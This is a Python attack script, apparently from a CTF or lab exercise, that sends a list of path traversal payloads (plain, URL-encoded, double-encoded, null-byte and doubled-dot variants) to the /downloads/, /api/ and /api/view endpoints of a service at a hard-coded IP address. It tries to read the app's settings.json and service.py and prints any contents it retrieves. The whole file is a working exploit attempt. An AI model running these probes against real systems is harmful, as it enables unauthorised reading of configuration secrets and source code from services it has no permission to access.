#!/usr/bin/env python3
"""Test path traversal on Orchard Society (newer runtime)."""
import requests

BASE = "http://54.72.82.22:8570"

# Path traversal attempts on /downloads/
paths = [
    '../app/settings.json',
    '../app/service.py',
    '..%2fapp%2fsettings.json',
    '..%2fapp%2fservice.py',
    '....//app//settings.json',
    '..;settings.json',
    '..%00settings.json',
    '/app/settings.json',
    '/app/service.py',
    'settings.json',
    'service.py',
    '../settings.json',
    '../../app/settings.json',
    '../../../app/settings.json',
    '..%2f..%2fapp%2fsettings.json',
    '%2e%2e%2fapp%2fsettings.json',
    '%2e%2e%2f%2e%2e%2fapp%2fsettings.json',
    '..%252fapp%252fsettings.json',
]

print("Testing /downloads/ path traversal...")
for path in paths:
    try:
        r = requests.get(f'{BASE}/downloads/{path}', timeout=10)
    except Exception as e:
        print(f"  /downloads/{path}: ERROR {e}")
        continue
    if r.status_code == 200 and len(r.text) > 50:
        print(f"!!! HIT /downloads/{path}: {r.status_code}")
        print(r.text[:500])
        exit(0)
    elif r.status_code != 404:
        print(f"  /downloads/{path}: {r.status_code} - {r.text[:100]}")

# Also test /api/ with path traversal in operation name
print("\nTesting /api/ path traversal...")
for path in ['../app/settings.json', '..%2fapp%2fsettings.json', 'view', 'read']:
    try:
        r = requests.get(f'{BASE}/api/{path}', timeout=10)
    except Exception:
        continue
    if r.status_code == 200 and 'Not found' not in r.text and len(r.text) > 50:
        print(f"!!! HIT /api/{path}: {r.status_code}")
        print(r.text[:500])
        exit(0)

# Test if there's a /api/view like :8300 (web-path kind)
print("\nTesting /api/view with name parameter...")
for name in ['settings.json', 'service.py', '/app/settings.json', '/app/service.py', '../settings.json', 'orchard-export.zip']:
    try:
        r = requests.get(f'{BASE}/api/view', params={'name': name}, timeout=10)
    except Exception:
        continue
    if r.status_code == 200 and 'Not found' not in r.text and len(r.text) > 50:
        print(f"!!! HIT /api/view?name={name}: {r.status_code}")
        print(r.text[:500])
        exit(0)

print("\nDone")